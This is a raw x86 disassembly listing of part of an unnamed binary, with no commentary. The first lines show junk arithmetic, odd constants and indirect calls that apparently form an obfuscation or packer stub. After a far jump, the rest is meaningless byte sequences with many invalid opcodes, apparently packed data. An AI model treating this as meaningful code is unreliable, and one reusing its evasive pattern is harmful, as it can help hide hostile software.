  419365:	inc    eax
  419366:	mov    ds:0x428eb3,eax
  41936b:	cmp    DWORD PTR ds:0x428eb3,0x15
  419372:	jae    0x41939a
  419378:	cmp    DWORD PTR ds:0x428eb3,0x21
  41937f:	ja     0x41939a
  419385:	jmp    0x419395
  41938a:	push   0x6ea1
  41938f:	call   DWORD PTR ds:0x42a9e7
  419395:	jmp    0x419360
  41939a:	mov    eax,ds:0x428493
  41939f:	mov    DWORD PTR [ebp-0x30],eax
  4193a2:	mov    DWORD PTR [ebp-0x2c],0xf89c85a5
  4193a9:	sub    DWORD PTR ds:0x428e3f,edi
  4193af:	mov    DWORD PTR [ebp-0x28],0xf89c85a4
  4193b6:	mov    eax,DWORD PTR [ebp-0x10]
  4193b9:	mov    ecx,DWORD PTR [ebp-0x10]
  4193bc:	sub    eax,ecx
  4193be:	mov    DWORD PTR [ebp-0x10],eax
  4193c1:	and    DWORD PTR ds:0x428e93,edi
  4193c7:	xor    DWORD PTR [ebp-0x10],0xf89cb5a5
  4193ce:	adc    ecx,0x318b
  4193d4:	mov    eax,DWORD PTR [ebp-0x18]
  4193d7:	mov    ecx,DWORD PTR [ebp-0x18]
  4193da:	xor    DWORD PTR ds:0x428e8f,edi
  4193e0:	sub    eax,ecx
  4193e2:	mov    DWORD PTR [ebp-0x18],eax
  4193e5:	sbb    DWORD PTR ds:0x428e5b,ebx
  4193eb:	or     DWORD PTR [ebp-0x18],0xf89f05a5
  4193f2:	or     DWORD PTR ds:0x428e2f,ebx
  4193f8:	mov    eax,DWORD PTR [ebp-0xc]
  4193fb:	adc    DWORD PTR ds:0x428e47,ecx
  419401:	mov    ecx,DWORD PTR [ebp-0xc]
  419404:	sub    eax,ecx
  419406:	add    DWORD PTR ds:0x428e6f,edx
  41940c:	mov    DWORD PTR [ebp-0xc],eax
  41940f:	and    DWORD PTR ds:0x428eb7,ecx
  419415:	or     DWORD PTR [ebp-0xc],0xf89c85e5
  41941c:	add    DWORD PTR ds:0x428ec7,ebx
  419422:	mov    eax,DWORD PTR [ebp-0x1c]
  419425:	mov    ecx,DWORD PTR [ebp-0x1c]
  419428:	sub    eax,ecx
  41942a:	add    edi,0xa93
  419430:	mov    DWORD PTR [ebp-0x1c],eax
  419433:	or     DWORD PTR ds:0x428e87,0x297e
  41943d:	or     DWORD PTR [ebp-0x1c],0xf89c8585
  419444:	mov    eax,DWORD PTR [ebp-0x20]
  419447:	mov    DWORD PTR ds:0x428e9f,0x15
  419451:	cmp    DWORD PTR ds:0x428e9f,0x0
  419458:	je     0x4194a7
  41945e:	cmp    DWORD PTR ds:0x428e9f,0x5
  419465:	jb     0x4194a7
  41946b:	jmp    0x419479
  419470:	push   DWORD PTR [ebp-0x20]
  419473:	call   DWORD PTR ds:0x42a9eb
  419479:	cmp    DWORD PTR ds:0x428e9f,0x6
  419480:	jne    0x419495
  419486:	xor    edi,edi
  419488:	or     edi,DWORD PTR ds:0x428e9f
  41948e:	dec    edi
  41948f:	mov    DWORD PTR ds:0x428e9f,edi
  419495:	mov    edi,DWORD PTR ds:0x428e9f
  41949b:	dec    edi
  41949c:	mov    DWORD PTR ds:0x428e9f,edi
  4194a2:	jmp    0x419451
  4194a7:	mov    ecx,DWORD PTR [ebp-0x20]
  4194aa:	sub    DWORD PTR ds:0x428e73,0x4181
  4194b4:	sub    eax,ecx
  4194b6:	mov    DWORD PTR [ebp-0x20],eax
  4194b9:	neg    edi
  4194bb:	mov    eax,DWORD PTR [ebp-0x2c]
  4194be:	mov    ecx,DWORD PTR [ebp-0x20]
  4194c1:	mov    esi,0x75108af
  4194c6:	xor    eax,esi
  4194c8:	add    DWORD PTR ds:0x428e2f,0x596
  4194d2:	mov    edi,0x3272f6
  4194d7:	or     DWORD PTR ds:0x428e43,0x428e77
  4194e1:	add    eax,edi
  4194e3:	or     eax,ecx
  4194e5:	mov    DWORD PTR ds:0x428e43,0x54e0
  4194ef:	mov    DWORD PTR [ebp-0x20],eax
  4194f2:	add    eax,0x58c9
  4194f7:	mov    eax,DWORD PTR [ebp-0x4]
  4194fa:	jmp    0x41b84d
  4194ff:	imul   edx,DWORD PTR [edi],0x45054527
  419505:	or     DWORD PTR [edi],edx
  419507:	dec    esp
  419508:	xchg   ecx,eax
  419509:	in     al,0xff
  41950b:	add    esi,DWORD PTR [eax+0x205da413]
  419511:	add    BYTE PTR [ebx-0x7c7c9fb3],0xba
  419518:	cli    
  419519:	cld    
  41951a:	jae    0x419586
  41951c:	cmp    DWORD PTR [edi+edi*2],esp
  41951f:	mov    ah,dh
  419521:	test   eax,0xdf72d265
  419526:	xor    eax,0x3f770a39
  41952b:	add    dh,BYTE PTR [edi+edi*8-0x42eaffb0]
  419532:	iret   
  419533:	xchg   ecx,eax
  419534:	cmp    al,BYTE PTR [eax-0x75207373]
  41953a:	dec    esi
  41953b:	pop    ecx
  41953c:	addr16 dec esi
  41953e:	jb     0x4194fe
  419540:	push   cs
  419541:	sub    cl,BYTE PTR [edi]
  419543:	mov    ss,WORD PTR ss:0x48e5
  419549:	retf   
  41954a:	daa    
  41954b:	dec    esi
  41954c:	jbe    0x4194e7
  41954e:	or     BYTE PTR [edx],cl
  419550:	mov    al,0x3b
  419552:	or     eax,0xb02a2767
  419557:	mov    ecx,0x5581036
  41955c:	and    al,0xba
  41955e:	test   eax,0x55673b09
  419563:	and    DWORD PTR [ebx-0xc],0x11
  419567:	add    edx,0x860908c6
  41956d:	shl    BYTE PTR [esi+0x49a9e283],1
  419573:	jns    0x4195ee
  419575:	cs in  al,0xa1
  419578:	pop    edx
  419579:	push   esi
  41957a:	test   dl,bl
  41957c:	ins    DWORD PTR es:[edi],dx
  41957d:	popa   
  41957e:	cmp    ch,BYTE PTR [ecx]
  419580:	stos   DWORD PTR es:[edi],eax
  419581:	add    al,0xc4
  419583:	pop    eax
  419584:	pop    ebx
  419585:	dec    edi
  419586:	rol    DWORD PTR [edx+ebx*4+0x58],1
  41958a:	je     0x41952b
  41958c:	sub    eax,0x91b19ac2
  419591:	cli    
  419592:	rcl    BYTE PTR [ecx],0xfd
  419595:	xor    BYTE PTR [esi+ebx*1-0x1c],bl
  419599:	pop    eax
  41959a:	fsubr  QWORD PTR [eax-0x1bb0a0cd]
  4195a0:	popa   
  4195a1:	adc    DWORD PTR [edx+0xc371207],ecx
  4195a7:	cs inc eax
  4195a9:	mov    ebp,0x4714d8e5
  4195ae:	das    
  4195af:	xchg   esi,eax
  4195b0:	scas   al,BYTE PTR es:[edi]
  4195b1:	ja     0x4195b4
  4195b3:	and    eax,0x59c364c8
  4195b8:	sahf   
  4195b9:	add    al,0xae
  4195bb:	xor    bl,BYTE PTR [ebp-0x2bb57e43]
  4195c1:	push   ds
  4195c2:	jae    0x419609
  4195c4:	pop    edx
  4195c5:	pop    ss
  4195c6:	inc    ebp
  4195c7:	(bad)  
  4195c8:	loop   0x419642
  4195ca:	je     0x419590
  4195cc:	fnstsw WORD PTR [ecx-0x7a]
  4195cf:	adc    DWORD PTR [ecx+0xc],ebx
  4195d2:	pop    ss
  4195d3:	data16 scas al,BYTE PTR es:[edi]
  4195d5:	sbb    al,BYTE PTR [ebx-0x4f]
  4195d8:	push   edx
  4195d9:	inc    esi
  4195da:	enter  0x9e3,0x66
  4195de:	pushf  
  4195df:	(bad)  [ecx]
  4195e1:	out    dx,eax
  4195e2:	inc    ecx
  4195e3:	clc    
  4195e4:	xchg   BYTE PTR [eax+ebx*8],cl
  4195e7:	sahf   
  4195e8:	pushf  
  4195e9:	sar    BYTE PTR [ebx],0xfa
  4195ec:	sbb    edi,DWORD PTR [esi+0x71]
  4195ef:	scas   al,BYTE PTR es:[edi]
  4195f0:	repnz in al,dx
  4195f2:	clc    
  4195f3:	sub    al,0x19
  4195f5:	in     al,dx
  4195f6:	push   eax
  4195f7:	pop    ecx
  4195f8:	ja     0x41959b
  4195fa:	jle    0x41962f
  4195fc:	ds push 0x4ed4fefe
  419602:	xchg   DWORD PTR [edx-0x21d2993a],ecx
  419608:	inc    ebp
  419609:	xchg   ebp,eax
  41960a:	ret    0xcb90
  41960d:	dec    eax
  41960e:	inc    ebx
  41960f:	mov    fs,WORD PTR [esi]
  419611:	ror    BYTE PTR [eax-0x598641b4],cl
  419617:	nop
  419618:	mov    ebp,0x2e15c17f
  41961d:	push   cs
  41961e:	retf   
  41961f:	mov    ?,edx
  419621:	pop    ebp
  419622:	fmul   QWORD PTR [eax-0x3ce93434]
  419628:	adc    al,0xc4
  41962a:	jecxz  0x4195dc
  41962c:	push   ebx
  41962d:	sub    edx,0x70
  419630:	pop    edi
  419631:	fmul   st,st(7)
  419633:	cmp    BYTE PTR [ebp+esi*1-0x61],dl
  419637:	ret    
  419638:	std    
  419639:	pop    es
  41963a:	inc    edx
  41963b:	sub    BYTE PTR [ebx+ecx*2],ah
  41963e:	pop    ds
  41963f:	xlat   BYTE PTR ds:[ebx]
  419640:	dec    edi
  419641:	mov    es,WORD PTR [esi-0x30ddb777]
  419647:	sbb    BYTE PTR [edi],bl
  419649:	sar    BYTE PTR [eax],cl
  41964b:	pop    esp
  41964c:	pop    ebp
  41964d:	mov    al,0xa2
  41964f:	dec    ebp
  419650:	and    DWORD PTR [esp+esi*2+0x5c2f9395],0xbfbc3bf7
  41965b:	(bad)  
  41965c:	jmp    0xd24f190a
  419661:	mov    eax,ds:0x6e7df96
  419666:	pop    eax
  419667:	rcr    dl,1
  419669:	mov    bh,0x41
  41966b:	xchg   BYTE PTR [eax-0x41],bh
  41966e:	mov    DWORD PTR [edx+0x38a629b7],esi
  419674:	icebp  
  419675:	adc    BYTE PTR [eax+0x221b0863],bh
  41967b:	jno    0x4196b6
  41967d:	sub    BYTE PTR [ecx],0x79
  419680:	cwde   
  419681:	ficomp WORD PTR [eax+0x3baf048e]
  419687:	test   al,0x6b
  419689:	test   eax,0x8b8f215b
  41968e:	adc    ch,BYTE PTR [eax-0x46]
  419691:	inc    esi
  419692:	scas   al,BYTE PTR es:[edi]
  419693:	das    
  419694:	inc    edi
  419695:	inc    edx
  419696:	mov    ?,WORD PTR [edx+0x17]
  419699:	push   esi
  41969a:	int3   
  41969b:	xchg   ecx,eax
  41969c:	adc    BYTE PTR [ebx+0x4e],dh
  41969f:	cmp    al,0x1b
  4196a1:	mov    dh,0x9e
  4196a3:	push   ebx
  4196a4:	mov    ebp,cs
  4196a6:	or     edx,ebp
  4196a8:	mov    al,0x45
  4196aa:	sub    dl,BYTE PTR [eax+0x40]
  4196ad:	ins    DWORD PTR es:[edi],dx
  4196ae:	push   ebx
  4196af:	imul   ebp,eax,0x64
  4196b2:	rcl    ah,1
  4196b4:	dec    ebp
  4196b5:	jno    0x41965b
  4196b7:	imul   esp,DWORD PTR [ebx+esi*4-0x6db4bc88],0xffffff82
  4196bf:	and    cl,BYTE PTR [eax-0x7f]
  4196c2:	xchg   edi,eax
  4196c3:	mov    cl,0xa
  4196c5:	pop    ebp
  4196c6:	ins    DWORD PTR es:[edi],dx
  4196c7:	pop    edi
  4196c8:	mov    al,ds:0x9a349c22
  4196cd:	hlt    
  4196ce:	add    al,0x41
  4196d0:	ja     0x4196f6
  4196d2:	adc    ah,BYTE PTR [edi]
  4196d4:	cwde   
  4196d5:	ret    0xbb90
  4196d8:	pop    ds
  4196d9:	dec    ebx
  4196da:	xor    dh,BYTE PTR [ebp+0x67cca463]
  4196e0:	cmp    eax,0x2ed167e
  4196e5:	in     al,0xb1
  4196e7:	sbb    ebx,esp
  4196e9:	imul   DWORD PTR [ebp+0x78]
  4196ec:	adc    dl,ah
  4196ee:	sbb    ch,BYTE PTR ds:0x3186ad3f
  4196f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196f5:	dec    eax
  4196f6:	in     eax,0x55
  4196f8:	push   edx
  4196f9:	xor    al,0x5
  4196fb:	adc    BYTE PTR [ecx+0x4ff161e3],ch
  419701:	out    dx,al
  419702:	add    edi,ecx
  419704:	lds    ebx,FWORD PTR [edx-0x33]
  419707:	in     eax,dx
  419708:	or     dl,BYTE PTR [esi]
  41970a:	mov    ebx,0x7bf04aab
  41970f:	mov    edx,0xf77d1443
  419714:	psllq  mm3,QWORD PTR [edi+0x2da25f1e]
  41971b:	gs dec edi
  41971d:	inc    esp
  41971e:	jle    0x41975a
  419720:	rcl    BYTE PTR [edi-0x757c0689],1
  419726:	lahf   
  419727:	call   0x2dadce9a
  41972c:	fisub  DWORD PTR [edx+0x60]
  41972f:	dec    edx
  419730:	jp     0x419730
  419732:	loop   0x4196e7
  419734:	dec    ecx
  419735:	xchg   esp,eax
  419736:	jb     0x4197a7
  419738:	mov    eax,0xa8fc9a9b
  41973d:	(bad)  
  41973e:	(bad)  
  41973f:	and    ch,BYTE PTR [ebp+edx*4+0x3664edca]
  419746:	jp     0x4196cd
  419748:	out    dx,eax
  419749:	or     eax,0xa29987a2
  41974e:	mov    ah,0x28
  419750:	xchg   esp,eax
  419751:	fild   WORD PTR [edx]
  419753:	retf   
  419754:	sbb    eax,DWORD PTR [esi-0x268d2ab2]
  41975a:	push   0xffffffa7
  41975c:	mov    edx,0xae5c1fe6
  419761:	mov    BYTE PTR [ebp+0x12],ah
  419764:	aad    0x8f
  419766:	mov    edx,0xf3b39173
  41976b:	shr    ch,0x7f
  41976e:	sub    ch,BYTE PTR [esi+0x51]
  419771:	adc    al,0x35
  419773:	push   ecx
  419774:	mov    ds:0xdf341298,al
  419779:	aaa    
  41977a:	sub    ebp,DWORD PTR ds:0xbe9f9e9c
  419780:	in     eax,0x91
  419782:	leave  
  419783:	nop
  419784:	push   ds
  419785:	popf   
  419786:	sub    DWORD PTR [ecx+0xd],esi
  419789:	xor    eax,0x956066ac
  41978e:	out    0x6,al
  419790:	push   ss
  419791:	test   BYTE PTR [ebp+0x64],bh
  419794:	test   eax,0xb52acf20
  419799:	jmp    0xff645188
  41979e:	xor    DWORD PTR [edi+0x3d],0x5c81389a
  4197a5:	add    edx,esi
  4197a7:	(bad)  
  4197a8:	dec    DWORD PTR [edi+0x4a49acf5]
  4197ae:	mov    al,ds:0x332b52af
  4197b3:	lahf   
  4197b4:	out    0xac,al
  4197b6:	push   edi
  4197b7:	rcl    DWORD PTR [edi],0x4e
  4197ba:	hlt    
  4197bb:	(bad)  
  4197bc:	inc    edi
  4197bd:	xchg   esp,esi
  4197bf:	xor    BYTE PTR [ebp+0x43],al
  4197c2:	inc    edi
  4197c3:	mov    edx,DWORD PTR [esi-0x43]
  4197c6:	fimul  DWORD PTR [edx]
  4197c8:	bound  edx,QWORD PTR [ebx+0x1580699a]
  4197ce:	(bad)  
  4197cf:	std    
  4197d0:	xor    ah,BYTE PTR [edx]
  4197d2:	aam    0x56
  4197d4:	bnd ret 0x77b8
  4197d8:	jle    0x41978e
  4197da:	rcr    DWORD PTR [esi-0x16bbc083],1
  4197e0:	sbb    al,0xb6
  4197e2:	inc    ecx
  4197e3:	in     eax,dx
  4197e4:	in     al,0xf0
  4197e6:	test   al,0x21
  4197e8:	les    eax,FWORD PTR [edi-0x2a674f8]
  4197ee:	add    al,0x6f
  4197f0:	pusha  
  4197f1:	loop   0x419786
  4197f3:	in     eax,dx
  4197f4:	cmp    eax,0x1001af9d
  4197f9:	ins    BYTE PTR es:[edi],dx
  4197fa:	das    
  4197fb:	ret    
  4197fc:	push   ds
  4197fd:	sbb    bh,al
  4197ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419800:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419802:	fisubr DWORD PTR [eax]
  419804:	gs hlt 
  419806:	mov    edx,0x2b6ccb2c
  41980b:	mov    dl,0x36
  41980d:	idiv   BYTE PTR [eax+0x24]
  419810:	mov    eax,0xecd195b6
  419815:	mov    dl,al
  419817:	(bad)  
  419818:	mov    esp,0x44f2a154
  41981d:	fsub   QWORD PTR [edi]
  41981f:	scas   eax,DWORD PTR es:[edi]
  419820:	mov    dh,0x7c
  419822:	xchg   ebx,eax
  419823:	mov    al,ds:0x44a974c6
  419828:	(bad)  [di+0x2b]
  41982c:	les    esi,FWORD PTR [eax+0x2987a102]
  419832:	dec    edx
  419833:	mov    ebx,0x1933b1f1
  419838:	push   0x4718756c
  41983d:	pusha  
  41983e:	popf   
  41983f:	cmp    BYTE PTR [ecx],cl
  419841:	outs   dx,DWORD PTR ds:[esi]
  419842:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419843:	push   0xb8a41c80
  419848:	sar    DWORD PTR [eax],cl
  41984a:	pop    edx
  41984b:	adc    bh,BYTE PTR [edx+0x92ec3c8]
  419851:	int    0x1a
  419853:	add    cl,0x4c
  419856:	ficom  WORD PTR [ecx+0x1b]
  419859:	adc    esi,DWORD PTR [edi]
  41985b:	loope  0x4198bc
  41985d:	sbb    al,0x69
  41985f:	(bad)  
  419860:	jge    0x41982e
  419862:	inc    ecx
  419863:	scas   eax,DWORD PTR es:[edi]
  419864:	ret    0x66d4
  419867:	sub    bh,cl
  419869:	arpl   WORD PTR [ecx+0x69bb1092],bp
  41986f:	xor    eax,0xcc4da554
  419874:	jb     0x41984a
  419876:	xchg   ebx,eax
  419877:	jmp    0x367f:0xa6c756fe
  41987e:	and    al,0x2d
  419880:	mov    cl,0x68
  419882:	jmp    0x4198cf
  419884:	imul   eax,esp,0x55ecb782
  41988a:	sbb    dl,cl
  41988c:	sbb    dh,BYTE PTR [eax+0x19]
  41988f:	sbb    BYTE PTR [ebx],al
  419891:	xchg   ebx,eax
  419892:	push   0xdfd445d4
  419897:	jge    0x419821
  419899:	push   esp
  41989a:	cmp    al,0xdf
  41989c:	retf   
  41989d:	fbld   TBYTE PTR [eax+0x71a932a8]
  4198a3:	(bad)  
  4198a4:	in     eax,0x37
  4198a6:	icebp  
  4198a7:	dec    edi
  4198a8:	ss int3 
  4198aa:	sub    BYTE PTR [edi-0x1f4fc8a3],ch
  4198b0:	js     0x41988d
  4198b2:	std    
  4198b3:	in     eax,0x3c
  4198b5:	add    BYTE PTR [edi+ebx*8-0x2c],ah
  4198b9:	sub    esi,DWORD PTR [ecx]
  4198bb:	jae    0x419906
  4198bd:	bound  edx,QWORD PTR [ebx]
  4198bf:	fsub   DWORD PTR [ebp-0x7e9abcc]
  4198c5:	mov    al,ds:0x5767689d
  4198ca:	xor    al,0x8e
  4198cc:	jne    0x419882
  4198ce:	pop    edx
  4198cf:	neg    BYTE PTR [ebx+0x152388ba]
  4198d5:	popa   
  4198d6:	stc    
  4198d7:	push   cs
  4198d8:	inc    edi
  4198d9:	sbb    eax,0x5feb2696
  4198de:	mov    ch,BYTE PTR [eax+esi*4]
  4198e1:	push   es
  4198e2:	jae    0x4198d0
  4198e4:	pop    ss
  4198e5:	mov    bl,BYTE PTR [ebx-0x3581af20]
  4198eb:	dec    ebp
  4198ec:	(bad)  
  4198ed:	mov    al,ds:0x603f6763
  4198f2:	xor    al,0x8c
  4198f4:	retf   0xa273
  4198f7:	xchg   ebx,eax
  4198f8:	jbe    0x41993b
  4198fa:	pop    ds
  4198fb:	sbb    ebp,esp
  4198fd:	xchg   ebx,eax
  4198fe:	(bad)  
  4198ff:	mov    WORD PTR ds:[ecx],gs
  419902:	cmp    cl,al
  419904:	dec    ebx
  419905:	lock aam 0xeb
  419908:	pop    ecx
  419909:	call   0x844:0x3b342bc3
  419910:	(bad)  
  419912:	test   eax,0x4a3e6031
  419917:	pop    ss
  419918:	ss cs or eax,0x8fcb77ea
  41991f:	mov    ds:0x2fcdec82,al
  419924:	push   ss
  419925:	scas   al,BYTE PTR es:[edi]
  419926:	mov    cl,BYTE PTR [edx-0x4d]
  419929:	or     eax,0x2c8062d2
  41992e:	push   esi
  41992f:	hlt    
  419930:	enter  0x7ba0,0x98
  419934:	mov    DWORD PTR [edx-0x41],esi
  419937:	stc    
  419938:	inc    ebx
  419939:	and    eax,0xcba11782
  41993e:	sub    al,0x7e
  419940:	daa    
  419941:	push   esp
  419942:	sbb    esp,DWORD PTR [edx+ebx*8]
  419945:	xor    eax,0xbcf9c15f
  41994a:	pop    es
  41994b:	into   
  41994c:	fistp  QWORD PTR [edi]
  41994e:	jmp    0x419919
  419950:	cmp    dh,BYTE PTR [ebx]
  419952:	fiadd  WORD PTR ds:[ebp-0x34]
  419956:	jmp    0x419961
  419958:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419959:	jmp    0xf7c90c7c
  41995e:	test   al,0xf3
  419960:	and    dl,ah
  419962:	add    bh,ch
  419964:	iret   
  419965:	mov    cl,0xfc
  419967:	(bad)  
  419968:	std    
  419969:	pusha  
  41996a:	loope  0x4199c9
  41996c:	xchg   ebx,eax
  41996d:	jecxz  0x41994b
  41996f:	sbb    ch,0x45
  419972:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419973:	out    dx,al
  419974:	out    0xe3,al
  419976:	jns    0x4199ae
  419978:	mov    ebx,0x7ac24835
  41997d:	(bad)  
  41997e:	mov    gs,WORD PTR fs:[esi+0x8]
  419982:	out    0x15,al
  419984:	out    0x67,eax
  419986:	mov    ebp,0x717272ad
  41998b:	mov    ebp,0x81616da2
  419990:	adc    eax,0x11cbae29
  419995:	dec    ebx
  419996:	aaa    
  419997:	out    0xeb,al
  419999:	jmp    DWORD PTR [edx-0x24]
  41999c:	fwait
  41999d:	sti    
  41999e:	retf   0xd6ea
  4199a1:	push   ss
  4199a2:	or     al,0xc0
  4199a4:	mov    ecx,0xa5d59dff
  4199a9:	popa   
  4199aa:	xchg   ebp,eax
  4199ab:	test   DWORD PTR [edx+0x12],ebp
  4199ae:	xchg   edx,eax
  4199af:	cmp    eax,0xf545276e
  4199b4:	mov    ax,ds:0x3fb19385
  4199ba:	push   esp
  4199bb:	addr16 xchg ecx,eax
  4199bd:	or     DWORD PTR [ebp-0x6a],esi
  4199c0:	sub    al,0x5a
  4199c2:	mov    ah,0xac
  4199c4:	repz mov eax,0xd3fde7da
  4199ca:	shl    dl,cl
  4199cc:	loope  0x419a42
  4199ce:	sub    eax,0x62a7d28
  4199d3:	xchg   edx,eax
  4199d4:	mov    dl,0x14
  4199d6:	mov    bl,0x26
  4199d8:	cwde   
  4199d9:	jo     0x4199d6
  4199db:	gs xor al,0x9e
  4199de:	xor    al,BYTE PTR [edx+0x24]
  4199e1:	outs   dx,DWORD PTR ds:[esi]
  4199e2:	mov    ah,0xee
  4199e4:	int    0x7e
  4199e6:	mov    ah,0x54
  4199e8:	mov    ?,edi
  4199ea:	add    cl,BYTE PTR [edi+0x207166ac]
  4199f0:	clc    
  4199f1:	imul   ecx,ebx,0x74
  4199f4:	cmp    eax,0xcb34d8c9
  4199f9:	jg     0x4199a5
  4199fb:	mov    al,ds:0xd64b55d
  419a00:	sub    al,bh
  419a02:	and    DWORD PTR [ecx+0x4e67ec77],esp
  419a08:	dec    ebx
  419a09:	mov    eax,0xf6da0383
  419a0e:	xor    edx,eax
  419a10:	sahf   
  419a11:	fadd   DWORD PTR fs:0x116be7c9
  419a18:	inc    eax
  419a19:	sub    edi,DWORD PTR [esi]
  419a1b:	xor    DWORD PTR [ebp-0x13],edi
  419a1e:	lods   eax,DWORD PTR es:[esi]
  419a20:	add    BYTE PTR [ebp-0x371fa2e0],ch
  419a26:	inc    eax
  419a27:	sbb    BYTE PTR [ebp+0x71],bh
  419a2a:	cdq    
  419a2b:	pop    esp
  419a2c:	cmp    edi,DWORD PTR [esi+0x68b59ba]
  419a32:	aam    0x5
  419a34:	out    dx,al
  419a35:	stos   DWORD PTR es:[edi],eax
  419a36:	push   edx
  419a37:	push   esp
  419a38:	push   ss
  419a39:	loop   0x419a54
  419a3b:	js     0x419a9e
  419a3d:	addr16 fs aad 0xf9
  419a41:	leave  
  419a42:	sub    BYTE PTR [ebp-0x59],0x4f
  419a46:	add    eax,0x39a47c37
  419a4b:	sbb    dl,BYTE PTR [esi-0x4064f0dd]
  419a51:	pushf  
  419a52:	mov    al,ds:0xd927a7a8
  419a57:	js     0x419ab0
  419a59:	sub    al,BYTE PTR [ebx+edi*8]
  419a5c:	mov    dh,0xbf
  419a5e:	out    dx,al
  419a5f:	jmp    0xa1b44fd9
  419a64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a65:	push   esi
  419a66:	shl    DWORD PTR [ebx+0x2f7ef8f3],0xd5
  419a6d:	mov    dh,0x16
  419a6f:	js     0x4199fd
  419a71:	in     eax,dx
  419a72:	jnp    0x419ab2
  419a74:	jne    0x419a52
  419a76:	sub    bl,BYTE PTR [ebp+0x48]
  419a79:	inc    ecx
  419a7a:	mov    al,0x60
  419a7c:	sbb    eax,0x93cf18be
  419a81:	mov    ss,WORD PTR [edi-0x4a8dfe5d]
  419a87:	lea    edi,[edi+0x289aaa81]
  419a8d:	int    0x79
  419a8f:	cmc    
  419a90:	je     0x419a4e
  419a92:	pop    es
  419a93:	jge    0x419a85
  419a95:	xor    ebp,0x1d7934d6
  419a9b:	mov    ecx,0x3c6795bb
  419aa0:	jae    0x419a6d
  419aa2:	pop    eax
  419aa3:	mov    al,0x84
  419aa5:	gs mov dl,0xcc
  419aa8:	lea    ecx,[ecx+0x46]
  419aab:	dec    esp
  419aac:	and    BYTE PTR [esp+ebp*2],dh
  419aaf:	add    eax,0xcf3e4f28
  419ab4:	imul   esi,DWORD PTR [ebx+ecx*1+0xd],0x36
  419ab9:	and    eax,0xd5bb9fcb
  419abe:	mov    bl,0x93
  419ac0:	loope  0x419b07
  419ac2:	in     eax,0x77
  419ac4:	fiadd  WORD PTR [ebx+0x65]
  419ac7:	lods   eax,DWORD PTR ds:[esi]
  419ac8:	(bad)  
  419aca:	mov    eax,ds:0x3f88628f
  419acf:	adc    eax,0x49001893
  419ad4:	in     al,dx
  419ad5:	outs   dx,DWORD PTR ds:[esi]
  419ad6:	jae    0x419a8e
  419ad8:	push   0x55
  419ada:	dec    edx
  419adb:	add    ebx,edx
  419add:	sbb    DWORD PTR gs:[edx],0x18a9c99a
  419ae4:	dec    esp
  419ae5:	fnstcw WORD PTR [eax+0x2d541b20]
  419aeb:	or     al,0xb9
  419aed:	jmp    0x7612:0x915b9e59
  419af4:	hlt    
  419af5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419af6:	leave  
  419af7:	jnp    0x419aa3
  419af9:	ret    
  419afa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419afb:	cmp    al,0xef
  419afd:	fisubr WORD PTR [ebp-0x69]
  419b00:	sub    BYTE PTR [edi],0xf
  419b03:	xor    eax,0xfc151dce
  419b08:	cli    
  419b09:	xor    eax,DWORD PTR [ebp+0x57aff734]
  419b0f:	cmovbe eax,esp
  419b12:	jbe    0x419b30
  419b14:	jae    0x419abe
  419b16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b17:	sbb    DWORD PTR [ebx],esi
  419b19:	imul   edi,DWORD PTR [esi]
  419b1c:	mov    ecx,0x971f13d
  419b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b22:	jae    0x419aae
  419b24:	dec    ecx
  419b25:	test   eax,0x1d514797
  419b2a:	stos   DWORD PTR es:[edi],eax
  419b2b:	inc    ebp
  419b2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b2d:	icebp  
  419b2e:	add    ebp,esi
  419b30:	lods   eax,DWORD PTR ds:[esi]
  419b31:	pusha  
  419b32:	adc    bl,0x2b
  419b35:	jle    0x419b5c
  419b37:	ficom  WORD PTR [edx-0x73]
  419b3a:	nop
  419b3b:	dec    edx
  419b3c:	aad    0x9c
  419b3e:	push   edx
  419b3f:	pop    ds
  419b40:	jg     0x419acb
  419b42:	xchg   edx,eax
  419b43:	add    dh,BYTE PTR [eax+0x7f7fff19]
  419b49:	mul    BYTE PTR [esi+0x2bc382d7]
  419b4f:	inc    ebp
  419b50:	test   esi,edx
  419b52:	repz in eax,0x96
  419b55:	cmp    DWORD PTR [eax],ebp
  419b57:	xor    DWORD PTR [eax+0x1de5a1a],esi
  419b5d:	xchg   edx,eax
  419b5e:	pop    esi
  419b5f:	ds ja  0x419b66
  419b62:	xlat   BYTE PTR ds:[ebx]
  419b63:	sub    ecx,DWORD PTR [edx-0x1b]
  419b66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b67:	bt     DWORD PTR ds:0x29ed7cdb,ecx
  419b6e:	mov    cl,0xeb
  419b70:	leave  
  419b71:	dec    BYTE PTR [edi]
  419b73:	sbb    dh,BYTE PTR [esi-0x6c24516d]
  419b79:	lds    esp,FWORD PTR [edi+0x4d]
  419b7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b7d:	(bad)  
  419b7e:	sar    BYTE PTR ds:0xbc00fa11,cl
  419b84:	bound  ebp,QWORD PTR [esi-0x2ece1423]
  419b8a:	push   ebx
  419b8b:	sub    dh,0xdf
  419b8e:	xor    DWORD PTR [eax-0x6bc2d0d1],0xabc81316
  419b98:	gs stos BYTE PTR es:[edi],al
  419b9a:	mov    eax,ds:0x79e91490
  419b9f:	and    BYTE PTR [edx-0x5f3735f8],dh
  419ba5:	ror    BYTE PTR [ebp-0x7],cl
  419ba8:	call   0x45499557
  419bad:	cmp    BYTE PTR [ecx],bh
  419baf:	in     eax,0x41
  419bb1:	add    BYTE PTR [eax-0x3f6415a3],dh
  419bb7:	or     al,0xa0
  419bb9:	and    edx,DWORD PTR [ebx]
  419bbb:	fdivr  DWORD PTR [edi]
  419bbd:	add    al,0xcf
  419bbf:	jmp    0x6ef5908a
  419bc4:	div    DWORD PTR [ebx]
  419bc6:	repz mov ds:0x9d2ddb44,eax
  419bcc:	xor    ebx,ecx
  419bce:	cmc    
